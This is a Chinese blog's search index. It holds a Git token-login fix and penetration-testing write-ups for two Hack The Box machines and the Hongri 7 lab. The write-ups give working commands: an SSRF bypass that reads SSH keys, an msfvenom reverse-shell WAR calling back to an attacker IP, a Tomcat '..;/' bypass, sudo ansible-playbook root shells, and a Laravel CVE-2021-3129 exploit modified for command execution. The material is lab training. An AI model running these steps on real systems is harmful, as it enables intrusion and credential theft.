<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>失败</title>
    <link href="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/"/>
    <url>/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Logon-failed-use-ctrl-c-to-cancel-basic-credential-prompt"><a href="#Logon-failed-use-ctrl-c-to-cancel-basic-credential-prompt" class="headerlink" title="Logon failed, use ctrl+c to cancel basic credential prompt."></a><a href="https://www.cnblogs.com/steamed-twisted-roll/p/14155092.html">Logon failed, use ctrl+c to cancel basic credential prompt.</a></h1><p>本地推送代码带Git仓库失败,报错Logon failed, use ctrl+c to cancel basic credential prompt.</p><p>推送的时候弹出githup的登陆框,账号密码正确但是提示不正确</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C1.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C2.png"></p><p>解决方法:在网页上登陆你自己的githup账号,点击右上角头像–&gt; setting –&gt; Developer settings –&gt; Personal access tokens页面</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C3.png"></p><p>点击新建 genrate new token</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C4.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C5.png"></p><p>新建完成,页面已经有一个新的token,这个页面先不要动,或者先复制出来,页面刷新后这个token就看不见了</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C6.png"></p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C7.png"></p><p>回到git bash 继续提交,在githup登陆弹出框中输入账号密码,第一次输入的是你githup的账号密码,第二次弹出后输入git账号,密码换成刚刚生成的token.</p><p>如果两次错误,会提示你在git bash中输入账号,之后会弹出一个密码框,这个也是输入token</p><p>总之,账号还是输入你自己的git账号,密码,第二次之后输入token</p><p><img src="/2022/01/25/gitpush%E5%A4%B1%E8%B4%A5/.%5Cgitpush%E5%A4%B1%E8%B4%A5%5C8.png"></p><p>成功后就能推送成功了</p><p>这个方法我这里有用,电脑是Windows系统</p>]]></content>
    
    
    <categories>
      
      <category>常见错误</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>常见错误</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>迷糊的提权方式以及利用ssrf到最终提权靶机</title>
    <link href="/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/01/22/%E8%BF%B7%E7%B3%8A%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8ssrf%E5%88%B0%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>目标是国外靶场</p><p>打过才知道 学的知识太少了<br>师傅们看看就行 大家都会 要是描述得不对的地方 求指点</p><p>本地环境： kali</p><h2 id="首先是通过ssrf拿下的靶机"><a href="#首先是通过ssrf拿下的靶机" class="headerlink" title="首先是通过ssrf拿下的靶机"></a>首先是通过ssrf拿下的靶机</h2><h3 id="第一台"><a href="#第一台" class="headerlink" title="第一台"></a>第一台</h3><p>因为是连了vpn的所以可以直接扫<br>目标ip:10.10.11.111<br>拿到目标 只有ip 那就先扫端口<br>nmap -v -sSV -Pn 10.10.11.111 -T4 -sC</p><p><img src="https://api2.mubu.com/v3/document_image/2b5874b4-2ba6-4837-9478-39f0e6b45dcb-11763069.jpg" alt="image"></p><p>没啥信息 只有80端口 那就打开web看看<br>直接访问10.10.11.111</p><p><img src="https://api2.mubu.com/v3/document_image/ee2d18b0-381b-490c-83db-d7ea3e6b632f-11763069.jpg" alt="image"></p><p>直接访问不了 添加host头</p><blockquote><p>echo “10.10.11.111 forge.xxx” &gt;&gt; /etc/hosts</p></blockquote><p>然后在次访问</p><p><img src="https://api2.mubu.com/v3/document_image/8a469e49-e676-4f34-a553-4cd96f55a114-11763069.jpg" alt="image"></p><p>能访问了 发现有个上传的地方</p><p><img src="https://api2.mubu.com/v3/document_image/9e2e0b4d-8c9b-4735-99d8-822e3069ca14-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/1324a8c9-b539-4751-8516-f5cbec32c248-11763069.jpg" alt="image"></p><p>上传试试</p><p><img src="https://api2.mubu.com/v3/document_image/0c02f059-7fb8-4ee0-ac44-6e003c04b47e-11763069.jpg" alt="image"></p><p>发现重命名的后缀名 不解析 上传应该是没办法了 找找其他突破<br>先扫扫目录 和子域名<br>目录：gobuster dir -u <a href="http://forge.xxx/">http://forge.xxx/</a> -w /usr/share/wordlists/dirb/common.txt</p><p><img src="https://api2.mubu.com/v3/document_image/8abd3da4-213b-4c5e-bced-47f6fd4530e7-11763069.jpg" alt="image"></p><p>子域名：wfuzz -c -u “<a href="http://forge.xxx/%E2%80%9C">http://forge.xxx/“</a> -H “Host:FUZZ.forge.xxx” -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</p><p><img src="https://api2.mubu.com/v3/document_image/6ac0b404-4b0a-4d6a-b364-5d75f7cf9c27-11763069.jpg" alt="image"></p><p>目录没扫出什么 扫到一个子域名 先进入看看<br>还是不能直接访问 先加入到host<br>echo “10.10.11.111 admin.forge.xxx” &gt;&gt; /etc/hosts</p><p>提示只能本地访问</p><p><img src="https://api2.mubu.com/v3/document_image/ffea800f-0a56-4aab-b623-50e1c1cf11f5-11763069.jpg" alt="image"></p><p>尝试加上X-Forwarded-For:127.0.0.1绕过失败。<br>但是前面那个上传的地方 还有一个上传路径的地方</p><p><img src="https://api2.mubu.com/v3/document_image/cf31cc76-7910-4191-8c57-db59fc63f362-11763069.jpg" alt="image"></p><p>但是直接上传会提示是黑名单地址</p><p><img src="https://api2.mubu.com/v3/document_image/eb5bfd91-dad0-4c72-99f7-b0db6c0f6e67-11763069.jpg" alt="image"></p><p>既然是黑名单 我们尝试绕过</p><p><img src="https://api2.mubu.com/v3/document_image/885d1a99-41a9-49a4-965a-c23b90bb93c3-11763069.jpg" alt="image"></p><p>大小写绕过了：<a href="http://admin.forge.xxx/">http://aDmin.forGe.xxx/</a><br>然后访问页面发现报错</p><p><img src="https://api2.mubu.com/v3/document_image/cc8d5c0c-3905-4ed6-81dd-d9e4faa2fa5c-11763069.jpg" alt="image"></p><p>然后通过抓返回包发现一个路径</p><p><img src="https://api2.mubu.com/v3/document_image/96964398-0f2e-4b71-815d-c457ae317e58-11763069.jpg" alt="image"></p><p>然后继续通过ssrf访问这个路径 继续进行抓包<br><a href="http://admin.forge.xxx/announcements">http://aDmin.forGe.xxx/announcements</a><br><img src="https://api2.mubu.com/v3/document_image/cb0a69bb-5fc7-4748-9206-7e7b3a5a4b94-11763069.jpg" alt="image"></p><p>然后访问路径抓取返回包 获得了ftp的密码</p><p><img src="https://api2.mubu.com/v3/document_image/e98fa15f-7dba-400f-bf54-6d1de195d0d4-11763069.jpg" alt="image"></p><p>user:heightofsecurity123!<br>以及获取/upload目录API用法，u=url<br><a href="http://admin.forge.xxx/upload?u=url">http://aDmin.forGe.xxx/upload?u=url</a></p><p>然后结合起来读取ftp<br><a href="ftp://user:heightofsecurity123!@forge.xxx/">ftp://user:heightofsecurity123!@FORGE.xxx</a></p><p><a href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx</a></p><p><img src="https://api2.mubu.com/v3/document_image/e59b5cd8-5203-4496-9c4d-52a71316dcc6-11763069.jpg" alt="image"></p><p>然后继续bp抓返回包</p><p><img src="https://api2.mubu.com/v3/document_image/b4e7e9b6-1789-48d9-84d9-ff990d6d45df-11763069.jpg" alt="image"></p><p>可以成功访问到，也就是说我们现在可以利用ssrf读取系统文件了。user.txt在这就说明现在已经是用户家目录了。读取ssh私钥<br><a href="http://admin.forge.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa">http://aDmin.forGe.xxx/upload?u=ftp://user:heightofsecurity123!@FORGE.xxx/.ssh/id_rsa</a></p><p><img src="https://api2.mubu.com/v3/document_image/7a353a44-6dbf-4ab2-9d60-7820be498f40-11763069.jpg" alt="image"></p><p>用同样的方法读取</p><p><img src="https://api2.mubu.com/v3/document_image/52dc38f3-2583-4785-a14d-ac41ac21dac0-11763069.jpg" alt="image"></p><p>然后保存id_rsa</p><p><img src="https://api2.mubu.com/v3/document_image/dd110bb3-b516-4122-be51-c8e95d166f24-11763069.jpg" alt="image"></p><p>然后ssh连接<br>ssh -i id_rsa <a href="mailto:&#x75;&#115;&#x65;&#114;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#x31;&#46;&#49;&#49;&#x31;">&#x75;&#115;&#x65;&#114;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#x31;&#46;&#49;&#49;&#x31;</a></p><p><img src="https://api2.mubu.com/v3/document_image/e0239698-ac25-4bcb-bb76-3745f2e062fd-11763069.jpg" alt="image"></p><p>成功连接上来</p><p><img src="https://api2.mubu.com/v3/document_image/d5081e0d-31ce-458f-b77c-4069fe199bb1-11763069.jpg" alt="image"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo -l 发现一个不需要密码执行的py文件</p><p><img src="https://api2.mubu.com/v3/document_image/b4eccb9a-0e65-4cfa-a239-8eec714f7bd7-11763069.jpg" alt="image"></p><p>然后看下这个文件</p><p><img src="https://api2.mubu.com/v3/document_image/2a6e2c39-8f05-4428-83b0-683b9ea512ec-11763069.jpg" alt="image"></p><p>发现是建立socket链接 监听40433端口 那就先执行这个py文件看看<br>先执行py文件看看 然后在用nc连接</p><p><img src="https://api2.mubu.com/v3/document_image/047fd3c2-59e0-42ac-aa46-115113aa4369-11763069.jpg" alt="image"></p><p>然后在随便输入的时候 发现会调用pdb调试<br>pdb模式下是可以执行python代码的。于是直接给bash加上suid提权</p><p><img src="https://api2.mubu.com/v3/document_image/b04c26bc-5721-4488-b661-e41da97d8924-11763069.jpg" alt="image"></p><p>pdb：pdb是The Python Debugger的缩写，为Python标准库的一个模块。该模块规定了一个Python程序交互式源代码调试器，支持设置断点，也支持源码级单步调试，栈帧监视，源代码列出，任意栈帧上下文的随机Python代码估值。</p><p>到此 这一台也就提权完毕</p><h2 id="第二台-利用ansible-playbook提权"><a href="#第二台-利用ansible-playbook提权" class="headerlink" title="第二台 利用ansible-playbook提权"></a>第二台 利用ansible-playbook提权</h2><h3 id="第二台"><a href="#第二台" class="headerlink" title="第二台"></a>第二台</h3><p>目标ip：10.10.10.250<br>拿到目标还是先扫描端口 进行信息收集</p><p><img src="https://api2.mubu.com/v3/document_image/04863ac9-d9cf-4e95-9f86-37a659f6fc3a-11763069.jpg" alt="image"></p><p>命令：nmap -v -sSV -Pn 10.10.10.250 -T4 -sC<br>发现开了22 443 8080<br>直接先打开8080端口看看</p><p><img src="https://api2.mubu.com/v3/document_image/9b96a63d-20fd-48bc-b21b-88a9d6ae2eaf-11763069.jpg" alt="image"></p><p>发现是一个登陆框 cms是 gitbucket<br>试了下弱口令 发现不存在 那就注册一个</p><p><img src="https://api2.mubu.com/v3/document_image/cc915f01-a5b7-4fe5-bb1e-e6ff8a4f3810-11763069.jpg" alt="image"></p><p>注册之后然后登录</p><p><img src="https://api2.mubu.com/v3/document_image/e5fd9cbb-c76a-4750-8905-18ca6de415a5-11763069.jpg" alt="image"></p><p>这应该是一个代码仓库</p><p><img src="https://api2.mubu.com/v3/document_image/b1cf2539-d293-4977-b65a-e2af9f552308-11763069.jpg" alt="image"></p><p>因为前面还有443端口开发 打开443端口看看</p><p><img src="https://api2.mubu.com/v3/document_image/4ca86c5a-fa40-478d-83aa-93a661b32811-11763069.jpg" alt="image"></p><p>之前nmap扫描出443端口，但是无法访问https，写入hosts尝试登录<br>添加到host 因为扫描出有一个seal.xxx</p><p><img src="https://api2.mubu.com/v3/document_image/42436620-2122-4193-a930-1c59b43155bb-11763069.jpg" alt="image"></p><p>echo 10.10.10.250 seal.xxx &gt;&gt; /etc/hosts<br>是一个商城 那8080 的的确是443的代码库</p><p>然后继续翻代码库 通过找最近commits 在tomcat里面翻到了账户密码</p><p><img src="https://api2.mubu.com/v3/document_image/90292c81-1956-4b24-9004-260ad74dd51c-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/0f9dde11-d568-4fed-8f24-8e40b3432a7b-11763069.jpg" alt="image"></p><p><a href="http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7">http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7</a><br>username = tomcat<br>password = 42MrHBf*z8{Z%<br>尝试访问tomcat默认登录目录<br>/manager/status<br><a href="https://seal.xxx/manager/status">https://seal.xxx/manager/status</a></p><p><img src="https://api2.mubu.com/v3/document_image/20e57c4c-dd26-49ec-9322-6e48e5abff76-11763069.jpg" alt="image"></p><p>输入找到的账户密码 成功登录</p><p><img src="https://api2.mubu.com/v3/document_image/9316b83e-640b-4af3-9415-8dce6b933752-11763069.jpg" alt="image"></p><p>因为前面根据nmap 扫描出tomcat是通过反代的 这样会存在一个问题<br>这个问题这里参考<a href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/</a><br>管理界面/manager/html无法访问显示权限不够</p><p><img src="https://api2.mubu.com/v3/document_image/ac5a0704-181a-414c-bec9-d8088c3b9a62-11763069.jpg" alt="image"></p><p>这里就可以利用tomcat 和反代的漏洞 用..;/绕过</p><p><img src="https://api2.mubu.com/v3/document_image/b137a294-867b-4ad5-8814-1215184059b9-11763069.jpg" alt="image"></p><p><a href="https://seal.xxx/manager/status/..;/html">https://seal.xxx/manager/status/..;/html</a><br>然后这里有一个上传的地方</p><p><img src="https://api2.mubu.com/v3/document_image/8984b9f6-0f75-461f-8ece-dfdb6e35dd9f-11763069.jpg" alt="image"></p><p>然后打包一个war包的shell上传<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.46 LPORT=6666 -f war -o shell.war</p><p>在上传之前，请记住一件事。这里存在路径遍历漏洞。所以，你不能直接上传.war文件。唯一的过程是在上传之前修改路径，因此我在Burpsuite中拦截了上传请求以进一步修改。</p><p><img src="https://api2.mubu.com/v3/document_image/fc183b54-5bdf-46b7-8836-7edbcdb223b3-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/245e4a1f-cd4b-444d-947e-ff5be5541a24-11763069.jpg" alt="image"></p><p>上传之后 开启监听 然后访问 <a href="https://seal.xxx/shell/">https://seal.xxx/shell/</a><br>nc -lvvp 6666</p><p><img src="https://api2.mubu.com/v3/document_image/8bb4c0fd-cba3-49a0-89a0-3c421b25b1d6-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/4edd03c1-2702-41f3-b1c3-0930cca2f994-11763069.jpg" alt="image"></p><p>发现还有个luis 这个开始在8080端口里面也发现了</p><p><img src="https://api2.mubu.com/v3/document_image/ea6fe118-2f0c-4de3-86bf-fffade801216-11763069.jpg" alt="image"></p><p>然后在lusi目录下发现user.txt</p><p><img src="https://api2.mubu.com/v3/document_image/ccd92432-2616-4860-ae41-ec1a2f86140a-11763069.jpg" alt="image"></p><p>命令：find / -name user.txt<br>但是查看user.txt的时候发现没有权限</p><p><img src="https://api2.mubu.com/v3/document_image/6776569f-1c51-449a-8886-b0fad61c3ab4-11763069.jpg" alt="image"></p><p>需要提权了</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>在查看进程的时候发现了一个有趣的进程</p><p><img src="https://api2.mubu.com/v3/document_image/f0d1e071-ce7b-498b-9bc7-dbf390a2dcab-11763069.jpg" alt="image"></p><p>命令：ps aux | grep root<br>然后我们看看run.yml文件</p><p><img src="https://api2.mubu.com/v3/document_image/7f9029bc-e2bd-4019-944d-15cd810a70ba-11763069.jpg" alt="image"></p><p>发现tomcat只有读的权限<br>cat /opt/backups/playbook/run.yml</p><p><img src="https://api2.mubu.com/v3/document_image/d5ee7b01-c400-4a1e-9841-ec40682e9c66-11763069.jpg" alt="image"></p><p>第 4 行至关重要。看起来这里脚本copy_links=yes在src和dest文件之间建立了符号链接（As ）。然后在第 8 行，它/opt/backups/archives以 gzip 格式备份文件。检查/var/lib/tomcat9/webapps/ROOT/admin/dashboard目录，</p><p><img src="https://api2.mubu.com/v3/document_image/4d45d27f-798d-400e-9986-229ddae797eb-11763069.jpg" alt="image"></p><p>发现只有uploads目录可写<br>网上了解搜索一下ansible playbook：<a href="https://blog.51cto.com/u_9019400/2385520">https://blog.51cto.com/u_9019400/2385520</a><br>这个yml是在做文件备份<br>所以创建一个指向luis的id_rsa的软链接文件，我们可以把它放到/uploads目录中<br>命令：ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa<br>然后可以在/opt/backups/archives下看到gz文件 然后解压</p><p><img src="https://api2.mubu.com/v3/document_image/b07fff18-584f-4832-9536-f574187a182d-11763069.jpg" alt="image"></p><p>然后将压缩文件复制到tmp目录下</p><p><img src="https://api2.mubu.com/v3/document_image/6c79b3c5-0b49-46bc-863b-f69cb3f7a51f-11763069.jpg" alt="image"></p><p>然后解压</p><p><img src="https://api2.mubu.com/v3/document_image/b7273e7e-f623-4846-940f-7837c4a8343f-11763069.jpg" alt="image"></p><p>命令：tar -xvf t.tar.gz<br>切换到uploads目录然后查看id_rsa</p><p><img src="https://api2.mubu.com/v3/document_image/b4ad96ff-504b-4f06-aa07-2ed63af10c70-11763069.jpg" alt="image"></p><p>保存到本地<br>然后ssh 连接 但是在连接之前 需要给chmod 600</p><p><img src="https://api2.mubu.com/v3/document_image/b6c2b9bb-ea27-48a0-8785-42b108d07bd4-11763069.jpg" alt="image"></p><p><img src="https://api2.mubu.com/v3/document_image/b6b37585-cf9f-4f9f-81de-ebe7eed1883b-11763069.jpg" alt="image"></p><p>然后成功查看user.txt<br>cat user.txt</p><p><img src="https://api2.mubu.com/v3/document_image/a6d81b90-6565-4458-83b0-e82fead6d365-11763069.jpg" alt="image"></p><h3 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h3><h4 id="第一种提权"><a href="#第一种提权" class="headerlink" title="第一种提权"></a>第一种提权</h4><p>sudo -l</p><p><img src="https://api2.mubu.com/v3/document_image/f957f7a8-8146-4d56-b456-764a8b29e640-11763069.jpg" alt="image"></p><p>发现luis不用密码就可以以root 执行ansible-playebook<br>直接在提权网址发现一个提权方式</p><p><img src="https://api2.mubu.com/v3/document_image/0d3bbb89-734b-48b7-a116-560d99c76d46-11763069.jpg" alt="image"></p><p>命令：<br>TF=$(mktemp)<br>echo ‘[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]‘ &gt;$TF<br>sudo ansible-playbook $TF</p><p>这样提权太快了<br>提权网址：<a href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p><h4 id="第二种提权："><a href="#第二种提权：" class="headerlink" title="第二种提权："></a>第二种提权：</h4><p>创建一个root.yml文件</p><p><img src="https://api2.mubu.com/v3/document_image/131e07c9-d29f-451e-88a7-f313652ecf64-11763069.jpg" alt="image"></p><p>然后：sudo /usr/bin/ansible-playbook root.yml</p><p><img src="https://api2.mubu.com/v3/document_image/78c8a8b9-bcf1-4bfd-8a83-57e9b5040a71-11763069.jpg" alt="image"></p><h4 id="第三种则是直接复制root-txt-也是创建yml文件"><a href="#第三种则是直接复制root-txt-也是创建yml文件" class="headerlink" title="第三种则是直接复制root.txt 也是创建yml文件"></a>第三种则是直接复制root.txt 也是创建yml文件</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">name:</span> Ansible Copy Example Local to Remote<br><span class="hljs-symbol">hosts:</span> localhost<br><span class="hljs-symbol">tasks:</span><br><span class="hljs-symbol">    name:</span> copying file with playbook<br><span class="hljs-symbol">    become:</span> true<br><span class="hljs-symbol">    copy:</span><br><span class="hljs-symbol">    src:</span> <span class="hljs-meta-keyword">/root/</span>root.txt<br><span class="hljs-symbol">    dest:</span> <span class="hljs-meta-keyword">/dev/</span>shm<br><span class="hljs-symbol">    owner:</span> luis<br><span class="hljs-symbol">    group:</span> luis<br><span class="hljs-symbol">    mode:</span> <span class="hljs-number">0777</span><br></code></pre></td></tr></table></figure><p>使用sudo /usr/bin/ansible-playbook执行root.yml文件<br>然后在dev/shm下找到root.txt</p><p><img src="https://api2.mubu.com/v3/document_image/3c9eb4c1-9696-4843-a169-b90ae0efeebe-11763069.jpg" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这两个靶机 还是学到了不少 ssrf的利用 通过返回包看见a标签里面有一个路径 然后ssrf读取 发现密钥 到最后通过 pdb提权<br>以及tomcat的..;绕过的方式 然后上传war 拿下shell 以及后面的利用ansible-playbook提权<br>最后 还是知识面不够阿<br>有什么不足 写得不对的地方 求师傅们指点</p>]]></content>
    
    
    <categories>
      
      <category>HTB靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日7</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A57/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A57/</url>
    
    <content type="html"><![CDATA[<ul><li><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图<img src="https://api2.mubu.com/v3/document_image/0ab4d441-cfe7-4ead-b4e7-942d60e0bea9-11763069.jpg" alt="img"></h2></li><li><p>环境配置</p><ul><li><p>DMZ区IP段为192.168.43.1/24  因为我这里是开热点打的  图用的网上的</p></li><li><p>第二层网络环境IP段为192.168.52.1/24</p></li><li><p>第三层网络环境IP段为192.168.93.1/24</p></li><li><p>DMZ区域</p><ul><li>Ubuntu（Web 1）配置了两个网卡，一个桥接可以对外提供服务，IP段设为 192.168.43.0/24，一个连接在 VMnet8 上，设为NAT模式，IP段设为 192.168.52.0/24 连通第二层网络</li></ul></li><li><p>第二层网络区域</p><ul><li>Ubuntu（Web 2）和 Windows 7（PC 1）都配置了两个网卡，一个连接在 VMnet8 上连通第二层网络，一个连接在 VMnet14 上，设为仅主机模式，IP段设为 192.168.93.0/24 连通第三层网络</li></ul></li><li><p>第三层网络区域</p><ul><li>Windows Server 2012 和 Windows 7（PC 2）都只配置了一个网卡，连接在 VMnet14 上连通第三层网络</li></ul></li><li><p>用户名密码</p><ul><li><p>域用户账户和密码如下：</p><ul><li><p>Administrator：Whoami2021</p></li><li><p>whoami：Whoami2021</p></li><li><p>bunny：Bunny2021</p></li><li><p>moretz：Moretz2021</p></li></ul></li><li><p>Ubuntu 1：</p><ul><li>web：web2021</li></ul></li><li><p>Ubuntu 2：</p><ul><li>ubuntu：ubuntu</li></ul></li><li><p>通达OA账户（不重要）：</p><ul><li>admin：admin657260</li></ul></li></ul></li><li><p>后面的网卡设置好就行<img src="https://api2.mubu.com/v3/document_image/0ffa7885-4057-4958-ba2c-82b9dc9a6d72-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/8524599a-b22e-4362-bc3d-50087ec92504-11763069.jpg" alt="img"></p></li><li><p>网络配置好了 还需要配置服务</p><ul><li><p>DMZ区的 Ubuntu 需要启动redis和nginx服务（经过后面的心酸，这里的redis得用root权限启动）：</p><ul><li><p>sudo su</p></li><li><p>redis-server /etc/redis.conf</p></li><li><p>/usr/sbin/nginx -c /etc/nginx/nginx.conf</p></li><li><p>iptables -F</p></li></ul></li><li><p>第二层网络的 Ubuntu需要启动docker容器（仍然需要root）：</p><ul><li><p>sudo su</p></li><li><p>service docker start</p></li><li><p>docker start 8e172820ac78</p></li></ul></li><li><p>第二层网络的 Windows 7 （PC 1）需要启动通达OA（这个得用administrator启动哦，并且要关闭防火墙）：</p><ul><li>C:\MYOA\bin\AutoConfig.exe</li></ul></li><li><p>开始配置<img src="https://api2.mubu.com/v3/document_image/a8a03216-3bc4-4008-9f04-ff43c74cb0b0-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/76e130ea-f7f1-4a2a-8e99-5b8ac27823f3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a6a6ab8e-0700-45d6-9d40-49b8b8e8e51a-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/60f55f3c-f7b9-4f7d-ac5d-45576eba5c4f-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/b5a024b9-365f-4494-b793-e8823ddfaca7-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/438093c2-d3fa-4726-bde1-b574b6ab35a3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/51c403de-e3bf-4a78-ae79-c201d793ba7b-11763069.jpg" alt="img"></p></li><li><p>至此 环境配置完成</p></li></ul></li></ul></li><li><h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><ul><li><h3 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h3></li><li><p>拿到DMZ的ip：192.168.43.129  首先打开看看<img src="https://api2.mubu.com/v3/document_image/6149f886-b4cc-492d-ab9e-6472749e89d8-11763069.jpg" alt="img"></p></li><li><p>空白啥都没有 但是网上的那些有blog不知道怎么回事 先不管 扫端口</p><ul><li>命令：nmap -T4 -A 192.168.31.132 -p 1-65535</li></ul></li><li><p>扫出4个端口</p><ul><li><p>22的ssh</p></li><li><p>80的nginx</p></li><li><p>81的Laravel</p></li><li><p>6379的redis</p></li></ul></li><li><p>因为80没东西 所以打开81看看<img src="https://api2.mubu.com/v3/document_image/bc53168d-600d-4663-bbbc-67cc79b4f026-11763069.jpg" alt="img"></p></li><li><p>是一个Laravel v8.29.0（一个简洁、开源的 PHP Web 开发框架）</p></li><li><p>直接网上找找公开漏洞</p></li><li><p>发现是有漏洞的CVE-2021-3129 然后直接找exp打</p></li><li><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p></li><li><p>克隆exp到kali</p><ul><li>命令：git clone git://<a href="http://github.com/crisprss/Laravel_CVE-2021-3129_EXP.git">github.com/crisprss/Laravel_CVE-2021-3129_EXP.git</a> </li></ul></li><li><p>然后将里面默认的url改为目标192.168.43.129<img src="https://api2.mubu.com/v3/document_image/3f49205e-0c3d-4e59-8d33-d13d7e5eb998-11763069.jpg" alt="img"></p></li><li><p>然后克隆phpggc到exp目录下 因为需要同目录<img src="https://api2.mubu.com/v3/document_image/49b884bf-81e7-4056-97cf-3e15d8dd53ce-11763069.jpg" alt="img"></p></li><li><p> 命令：git clone git://<a href="http://github.com/ambionics/phpggc.git">github.com/ambionics/phpggc.git</a> </p></li><li><p>然后执行命令：python3 exploit.py<img src="https://api2.mubu.com/v3/document_image/d724b4b0-863d-4b65-a906-057a540ae43c-11763069.jpg" alt="img"></p></li><li><p>然后改一下py脚本 改成任意执行命令</p></li><li><p>Vim打开脚本，首先在exploit.py开头import sys库 <img src="https://api2.mubu.com/v3/document_image/fbf5061b-b018-45d0-b3f1-7483fdf3c2b8-11763069.jpg" alt="img"></p></li><li><p>主函数改为如下内容（注意缩进）</p></li><li><p>args = sys.argv</p></li><li><p>url = args[1]</p></li><li><p>command = args[2]</p></li><li><p>Exp(url, command) <img src="https://api2.mubu.com/v3/document_image/053c9894-12c6-4188-833d-504ecb4d9a1e-11763069.jpg" alt="img"></p></li><li><p>然后执行命令<img src="https://api2.mubu.com/v3/document_image/7dc61f89-c3d4-4127-b44c-5a2c5b99776d-11763069.jpg" alt="img"></p></li><li><p>然后写shell  但是用这个exp一直写不上 就换了一个exp </p></li><li><p>直接写shell的 <img src="https://api2.mubu.com/v3/document_image/d0d9b178-3707-47b9-bb5d-d161cfdd2e47-11763069.jpg" alt="img"></p></li><li><p>然后用哥斯拉链接2.92版本的  3.03不知道为什么连不上</p><ul><li><a 